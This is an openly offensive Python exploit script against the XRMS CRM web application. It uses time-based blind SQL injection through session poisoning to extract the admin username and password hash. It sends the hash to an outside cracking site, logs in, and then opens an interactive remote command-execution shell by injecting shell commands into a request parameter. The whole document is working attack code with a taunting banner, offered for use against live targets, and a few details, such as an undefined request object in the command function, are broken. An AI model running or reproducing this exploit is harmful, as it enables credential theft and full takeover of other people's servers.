#######################
# XRMS Blind SQLi via $_SESSION poisoning, then command exec
#########################

import urllib
import urllib2
import time
import sys

usercharac = 
['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','@','.','_','-','1','2','3','4','5','6','7','8','9','0']
userascii = [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 
109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 
64, 46, 95, 45, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48]
def banner():
	print """	    ____                                      
	   / __/_  ______ _  _  ___________ ___  _____
	  / /_/ / / / __ `/ | |/_/ ___/ __ `__ \/ ___/
	 / __/ /_/ / /_/ / _>  </ /  / / / / / (__  ) 
	/_/  \__,_/\__, (_)_/|_/_/  /_/ /_/ /_/____/  
	             /_/                              
	[+] fuq th3 w0rld, fuq ur m0m!\n"""

def usage():
	print "	[+] Info: Remote Command Execution via $_SESSION 
poisoning to SQLi to RCE"
	print "	[+] Example:"
	print "	[+] python " + sys.argv[0] + " domain.to/xrms"
	quit()

def sendhashaway(hash):
	print " [+] Sending hash to icrackhash.com to be cracked."
	data = None
	headers = { 'Referer' : 'http://icrackhash.com/?mdhash=' + hash 
+ '&type=MD5','User-Agent' : 'Mozilla','X-Requested-With' : 
'XMLHttpRequest'}
	url = 'http://www.icrackhash.com/?mdhash=' + hash + '&type=MD5'
	gh = urllib2.Request(url,data,headers)
	gh2 = urllib2.urlopen(gh)
	output = gh2.read()
	plaintext = 
getpositions(output,'<td><small><strong>','</strong>')
	print " [-] Plaintext of hash: " +plaintext + "\n"
	return plaintext

def username(length):
	length = length + 1
	duser = []
	#1) UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -
	found = 0
	i = 1
	payload1 = "1) UNION ALL SELECT 
1,2,3,4,5,6,7,8,IF(SUBSTRING(username,"
	payload2 = ",1)=CHAR("
	payload3 = "),BENCHMARK(5000000,MD5(0x34343434)),NULL) FROM 
users-- -"
        for i in range(1,length):
		found = 0
		while(found != 1):
			for f in range(0,len(userascii)):
				class 
LeHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
					def http_error_302(self, req, 
fp, code, msg, headers):
						infourl = 
urllib2.addinfourl(fp, headers, req.get_full_url())
						infourl.status = code
						infourl.code = code
						return infourl
					http_error_300 = http_error_302    
				class HeadRequest(urllib2.Request):
					def get_method(self):
						return "POST"
				payload = payload1 + str(i) + payload2 + 
str(userascii[f]) + payload3
				data = 
urllib.urlencode([('user_id',payload)])
				url = 
'http://'+domain+'/plugins/webform/new-form.php'
				opener = 
urllib2.build_opener(LeHTTPRedirectHandler)
				req = HeadRequest(url,data)
				prepare = opener.open(req)
				cookie1 = prepare.info()
				cookie2pos1 = 
str(cookie1).find('PHPSESSID')
				cookie2pos2 = 
str(cookie1).find("\n",cookie2pos1)
				line = 
str(cookie1)[cookie2pos1:cookie2pos2 - 9]
				line = 'XRMS' + line[9:]
				url = 
'http://'+domain+'/plugins/useradmin/fingeruser.php'
				headers = { 'Cookie' : line }
				data = None
				start = time.time()
				get = urllib2.Request(url,data,headers)
				get.get_method = lambda: 'HEAD'
				try:
					execute = urllib2.urlopen(get)
				except:
					pass
				elapsed = (time.time() - start)
				if(elapsed > 1):
					print "	Character found. 
Character is: " + usercharac[f]
					duser.append(usercharac[f])
					found = 1
	return duser

def getusernamelength():
	found = 0
	i = 1
	payload1 = "1) UNION ALL SELECT 
1,2,3,4,5,6,7,8,IF(LENGTH(username) = '"
	payload2 = "',BENCHMARK(50000000,MD5(0x34343434)),NULL) FROM 
users-- -"
	while (found != 1): 
		class 
LeHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
			def http_error_302(self, req, fp, code, msg, 
headers):
				infourl = urllib2.addinfourl(fp, 
headers, req.get_full_url())
				infourl.status = code
				infourl.code = code
				return infourl
			http_error_300 = http_error_302    
		class HeadRequest(urllib2.Request):
			def get_method(self):
				return "POST"
		payload = payload1 + str(i) + payload2
		data = urllib.urlencode([('user_id',payload)])
		url = 'http://'+domain+'/plugins/webform/new-form.php'
		opener = urllib2.build_opener(LeHTTPRedirectHandler)
		req = HeadRequest(url,data)
		prepare = opener.open(req)
		cookie1 = prepare.info()
		cookie2pos1 = str(cookie1).find('PHPSESSID')
		cookie2pos2 = str(cookie1).find("\n",cookie2pos1)
		line = str(cookie1)[cookie2pos1:cookie2pos2 - 9]
		line = 'XRMS' + line[9:]
		url = 
'http://'+domain+'/plugins/useradmin/fingeruser.php'
		headers = { 'Cookie' : line }
		data = None
		start = time.time()
		get = urllib2.Request(url,data,headers)
		get.get_method = lambda: 'HEAD'
		try:
			execute = urllib2.urlopen(get)
		except:
			pass
		elapsed = (time.time() - start)
		if(elapsed > 1):
			print "	Length found at position: " + str(i)
			found = 1
			length = i
			return length
		i = i + 1

def password(length):
	length = length + 1
	dpassword = []
	#1) UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -
	found = 0
	i = 1
	payload1 = "1) UNION ALL SELECT 
1,2,3,4,5,6,7,8,IF(SUBSTRING(password,"
	payload2 = ",1)=CHAR("
	payload3 = "),BENCHMARK(5000000,MD5(0x34343434)),NULL) FROM 
users-- -"
        for i in range(1,length):
		found = 0
		while(found != 1):
			for f in range(0,len(userascii)):
				class 
LeHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
					def http_error_302(self, req, 
fp, code, msg, headers):
						infourl = 
urllib2.addinfourl(fp, headers, req.get_full_url())
						infourl.status = code
						infourl.code = code
						return infourl
					http_error_300 = http_error_302    
				class HeadRequest(urllib2.Request):
					def get_method(self):
						return "POST"
				payload = payload1 + str(i) + payload2 + 
str(userascii[f]) + payload3
				data = 
urllib.urlencode([('user_id',payload)])
				url = 
'http://'+domain+'/plugins/webform/new-form.php'
				opener = 
urllib2.build_opener(LeHTTPRedirectHandler)
				req = HeadRequest(url,data)
				prepare = opener.open(req)
				cookie1 = prepare.info()
				cookie2pos1 = 
str(cookie1).find('PHPSESSID')
				cookie2pos2 = 
str(cookie1).find("\n",cookie2pos1)
				line = 
str(cookie1)[cookie2pos1:cookie2pos2 - 9]
				line = 'XRMS' + line[9:]
				url = 
'http://'+domain+'/plugins/useradmin/fingeruser.php'
				headers = { 'Cookie' : line }
				data = None
				start = time.time()
				get = urllib2.Request(url,data,headers)
				get.get_method = lambda: 'HEAD'
				try:
					execute = urllib2.urlopen(get)
				except:
					pass
				elapsed = (time.time() - start)
				if(elapsed > 1):
					print "	Character found. 
Character is: " + usercharac[f]
					dpassword.append(usercharac[f])
					found = 1
	return dpassword

def login(domain,user,password):
	cookie = "XRMS=iseeurgettinown4d"
	url = 'http://'+domain+'/login-2.php'
	headers = { 'Cookie' : cookie }
	data = 
urllib.urlencode([('username',user),('password',password)])
	a1 = urllib2.Request(url,data,headers)
	a2 = urllib2.urlopen(a1)
	output = a2.read()
	if output.find('PEAR.php') > 0:
		print "	[+] Logged In"

def commandexec(domain,command):
	cookie = "XRMS=iseeurgettinown4d"
	cmd = urllib.urlencode([("; echo '0x41';" + command + ";echo 
'14x0';",None)])
	headers = { 'Cookie' : cookie }
	data = None
	url = 
'http://'+domain+'/plugins/useradmin/fingeruser.php?username=' + cmd
	b1 = urllib2.Request(url,data,headers)
	b2 = urllib2.urlopen(a1)
	output = b2.read()
	first = output.find('0x41') + 4
	last = output.find('14x0') - 4
	return output[first:last]

banner()
if len(sys.argv) < 2:
	usage()
domain = sys.argv[1]
print "	[+] Grabbing username length"
length = getusernamelength()
print "	[+] Grabbing username characters"
tmpuser = username(length)
adminusr = "".join(tmpuser)
print "	[+] Grabbing password hash"
tmppass =  password(32)
admpass = "".join(tmppass)
print " [+] Admin username: "+ adminusr
print "	[+] Admin password hash: " + admpass
plain = sendhashaway(admpass)
login(domain,adminusr,plain)
while(quit != 1):
	cmd = raw_input('	[+] Run a command: ')
	if cmd == 'quit':
		print "	[-] Hope you had fun :)"
		quit = 1
	if cmd != 'quit':
		print "	[+] "+ commandexec(domain,cmd)

